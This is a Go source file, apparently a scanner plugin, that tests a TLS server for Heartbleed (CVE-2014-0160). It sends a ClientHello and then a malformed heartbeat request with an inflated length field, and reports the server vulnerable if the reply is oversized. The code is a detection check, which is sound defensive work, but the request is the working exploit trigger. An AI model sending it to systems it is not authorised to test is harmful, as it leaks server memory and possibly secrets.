package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

func Run(target map[string]interface{}) map[string]string {
	output := make(map[string]string)

	ip, okIP := target["IP"].(string)
	port, okPort := target["Port"].(int)

	if !okIP || !okPort {
		return output
	}

	if port != 443 && port != 8443 && port != 993 && port != 995 {
		return output
	}

	vulnerable, err := checkHeartbleed(ip, port)
	if err != nil {
		return output
	}

	if vulnerable {
		output["CVE-2014-0160"] = "VULNERABLE - Le serveur est vulnérable à Heartbleed !"
	}

	return output
}

func checkHeartbleed(ip string, port int) (bool, error) {
	deadline := time.Now().Add(2500 * time.Millisecond)

	targetAddr := fmt.Sprintf("%s:%d", ip, port)
	dialer := net.Dialer{Deadline: deadline}
	conn, err := dialer.Dial("tcp", targetAddr)
	if err != nil {
		return false, err
	}
	defer conn.Close()

	clientHello := []byte{
		0x16, 0x03, 0x01, 0x00, 0x58, 0x01, 0x00, 0x00, 0x54, 0x03, 0x01, 0x53, 0x43, 0x5b, 0x90, 0x9d,
		0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
		0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x06, 0xc0, 0x14,
		0xc0, 0x0a, 0x00, 0x39, 0x00, 0x33, 0x01, 0x00, 0x00, 0x29, 0x00, 0x0f, 0x00, 0x01, 0x01,
	}

	heartbeatRequest := []byte{
		0x18,
		0x03, 0x01,
		0x00, 0x03,
		0x01,
		0x40, 0x00,
	}

	_ = conn.SetWriteDeadline(deadline)
	if _, err := conn.Write(clientHello); err != nil {
		return false, err
	}

	buf := make([]byte, 8192)
	for {
		_ = conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		_, err := conn.Read(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			return false, err
		}
	}

	_ = conn.SetWriteDeadline(deadline)
	if _, err := conn.Write(heartbeatRequest); err != nil {
		return false, err
	}

	_ = conn.SetReadDeadline(deadline)
	header := make([]byte, 5)
	n, err := conn.Read(header)
	if err != nil || n < 5 {
		return false, fmt.Errorf("n'a pas pu lire l'en-tête de la réponse heartbeat")
	}

	if header[0] != 0x18 {
		return false, nil
	}

	payloadLen := int(binary.BigEndian.Uint16(header[3:5]))

	return payloadLen > 3, nil
}
